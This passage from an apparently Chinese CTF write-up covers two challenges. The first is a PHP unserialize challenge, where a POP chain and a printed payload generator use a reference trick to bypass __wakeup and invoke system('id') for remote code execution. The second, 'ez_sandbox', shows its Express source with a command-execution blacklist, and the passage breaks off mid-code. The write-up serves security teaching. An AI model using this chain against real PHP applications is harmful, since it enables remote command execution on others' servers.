        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span><span class="token operator">-></span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在Cache类中expired方法会判断内部的expired属性是否为true，如果是，则会调用helper的clean方法，而clean发方法不存在，实际上就是调用<code>__call</code>方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里<code>__call</code>会按照传入的name从func数组中去除对应的函数名，然后将args作为参数来调用这个函数，这里就是存在getshell的地方。<br>如果要到达最后的<code>__call</code>方法，需要让Cache类中的expired属性为true，但是Cache中会先触发wakeup方法，这就使得expired为false，需要先绕过wakeup方法<br>原来有个新生赛就有这个知识点，使用php引用的概念</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这个时候b的值就等于a的值，b的值一旦改变，a的值也会跟着改变。a和b指向相同的内存地址</p>
<p>我们可以让expired属性成为某个变量的引用，这样即使现在expired属性值为false，但是后面的过程中一旦改变引用变量的值，expired 属性值也会被改变，只要值不是null，就会绕过if判断。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Cache</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$expired</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Storage</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">DataObject</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'clean'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$cache1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cache1</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>

<span class="token variable">$cache2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cache2</span><span class="token operator">-></span><span class="token property">helper</span> <span class="token operator">=</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
<span class="token variable">$cache2</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'id'</span><span class="token punctuation">;</span>

<span class="token variable">$storage</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Storage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$storage</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$cache2</span><span class="token operator">-></span><span class="token property">expired</span><span class="token punctuation">;</span>

<span class="token variable">$dataObject</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dataObject</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'key1'</span> <span class="token operator">=></span> <span class="token variable">$cache1</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'key2'</span> <span class="token operator">=></span> <span class="token variable">$cache2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dataObject</span><span class="token operator">-></span><span class="token property">storage</span> <span class="token operator">=</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$dataObject</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先往DataObject的data里传入两个实例，其中传入的cache2指定了helper，key值设置为要执行的命令，helper的clean()（实际上是<code>__call</code>的funcs数组）放入了system命令执行函数，然后让Storge的store属性成为cache2 expired 属性的引用</p>
<p>这样, 在反序列化时, 首先会调用两个 Cache 的 __wakeup 方法, 将各自的 expired 设置为 False<br>然后调用 dataObject 的 __destruct 方法, 从而调用 Storage 的 __set 方法<br>Storage 首先将 store (即 cache1 的 expired 属性) 初始化为一个空数组, 然后存入 cache1<br>此时, store 不为空, 那么也就是说 cache1 的 expired 属性不为空<br>然后来到 cache2, storage 的 __set 方法调用它的 expired 方法, 进入 if 判断<br>因为此时 cache2 的 expired 字段, 也就是上面的 store, 已经被设置成了一个数组, 并且数组中存在 cache1 (不为空), 因此这里 if 表达式的结果为 True<br>最后进入 helper 的 clean 方法, 执行 system(‘id’); 实现 RCE</p>
<h2 id="Week-2-ez-sandbox"><a href="#Week-2-ez-sandbox" class="headerlink" title="[Week 2] ez_sandbox"></a>[Week 2] ez_sandbox</h2><p>考点：JavaScript 原型链污染绕过、vm 沙箱逃逸</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">#app<span class="token punctuation">.</span>js



<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span>

<span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">secret</span><span class="token operator">:</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">var</span> users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> admins <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">'__proto__'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">continue</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> target
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">clone</span><span class="token punctuation">(</span><span class="token parameter">source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> source<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token parameter">code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'constructor'</span><span class="token punctuation">,</span> <span class="token string">'mainModule'</span><span class="token punctuation">,</span> <span class="token string">'require'</span><span class="token punctuation">,</span> <span class="token string">'child_process'</span><span class="token punctuation">,</span> <span class="token string">'process'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'execSync'</span><span class="token punctuation">,</span> <span class="token string">'execFile'</span><span class="token punctuation">,</span> <span class="token string">'execFileSync'</span><span class="token punctuation">,</span> <span class="token string">'spawn'</span><span class="token punctuation">,</span> <span class="token string">'spawnSync'</span><span class="token punctuation">,</span> <span class="token string">'fork'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> v <span class="token keyword">of</span> blacklist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>code<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>v <span class="token operator">+</span> <span class="token string">' is banned'</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">requireLogin</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">delete</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/index.html'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/login.html'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/register.html'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> users <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">=</span> username

        <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> admins<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role <span class="token operator">=</span> <span class="token string">'admin'</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role <span class="token operator">=</span> <span class="token string">'guest'</span>
        <span class="token punctuation">&#125;</span>

        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'login success'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'login failed'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> users<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'register failed'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> password
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'register success'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/profile'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token string-property property">'user'</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">,</span>
        <span class="token string-property property">'role'</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/sandbox'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> code <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>code
        <span class="token keyword">let</span> sandbox <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>
        <span class="token keyword">let</span> context <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span>
        
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token function">waf</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>
            <span class="token keyword">let</span> result <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> context<span class="token punctuation">)</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token string-property property">'result'</span><span class="token operator">:</span> result
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token string-property property">'result'</span><span class="token operator">:</span> e<span class="token punctuation">.</span>message
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">'result'</span><span class="token operator">:</span> <span class="token string">'Your role is not admin, so you can not run any code'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server start listening on :3000'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">delete</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这里每一次请求都会删除prototype值</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
